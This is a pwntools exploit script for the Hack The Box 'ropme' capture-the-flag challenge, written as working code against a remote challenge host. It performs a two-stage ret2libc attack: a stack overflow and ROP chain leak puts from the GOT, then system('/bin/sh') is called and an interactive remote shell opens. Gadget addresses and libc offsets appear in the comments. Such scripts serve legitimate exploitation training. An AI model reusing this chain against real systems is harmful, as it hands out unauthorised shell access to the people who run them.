#!/usr/bin/python
#Author memN0ps

from pwn import *

log.info("Pwnage by memN0ps!!!")
p = remote("docker.hackthebox.eu", 43944)
#context(terminal=['tmux', 'new-window'])
#p = process("./ropme")
#p = gdb.debug('./ropme', 'b main')

context(os="linux", arch="amd64")
#context.log_level="DEBUG"

#1st Stage Payload - Leak

#root@kali:~# objdump -D ropme |grep puts
#00000000004004e0 <puts@plt>:
#  4004e0:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)        # 601018 <puts@GLIBC_2.2.5>
#  40063a:       e8 a1 fe ff ff          callq  4004e0 <puts@plt>

#root@kali:~# radare2 ropme
#[0x00400530]> /R pop rdi
#  0x004006d3                 5f  pop rdi
#  0x004006d4                 c3  ret

#root@kali:~# objdump -D ropme | grep main
#00000000004004f0 <__libc_start_main@plt>:
#  4004f0:       ff 25 2a 0b 20 00       jmpq   *0x200b2a(%rip)        # 601020 <__libc_start_main@GLIBC_2.2.5>
#  400554:       e8 97 ff ff ff          callq  4004f0 <__libc_start_main@plt>
#0000000000400626 <main>:

plt_main = p64(0x400626) #Procedure Linkage Main
plt_put = p64(0x4004e0) #Procedure Linkage Table
got_put = p64(0x601018) #Global Offset Table
pop_rdi = p64(0x4006d3) #pop rdi; ret
junk = "A" * 72

#Payload
payload = junk + pop_rdi + got_put + plt_put + plt_main

p.recvuntil("dah?\n")
p.sendline(payload)

#Leaked address
leaked_puts = p.recvline()[:-1].strip().ljust(8, "\x00")
log.success("Leaked puts@GLIBC_2.2.5: " + str(leaked_puts))
leaked_puts = u64(leaked_puts[:8])
print("puts_addr: " + str(hex(leaked_puts)))

#2nd Stage Payload - Shell
#https://libc.blukat.me/?q=puts%3A0x7f8ae0b70690&l=libc6_2.23-0ubuntu10_amd64

#system	0x045390	0x0
#puts	0x06f690	0x2a300
#open	0x0f7030	0xb1ca0
#read	0x0f7250	0xb1ec0
#write	0x0f72b0	0xb1f20
#str_bin_sh	0x18cd57	0x1479c7

pop_rdi = p64(0x4006d3) #pop rdi; ret
libc_puts = 0x06f690 #libc puts offset
libc_sys = 0x045390 #libc system offset
libc_sh = 0x18cd57 #libc /bin/sh offset

#Calculate distance
offset = leaked_puts - libc_puts
sys = p64(libc_sys + offset)
sh = p64(libc_sh + offset - 64)

payload = junk + pop_rdi + sh + sys

#Send payload
p.recvuntil("dah?\n")
p.sendline(payload)

#Pause the program until we hit enter for debugging
#raw_input()

#Drop an interactive shell
p.interactive()
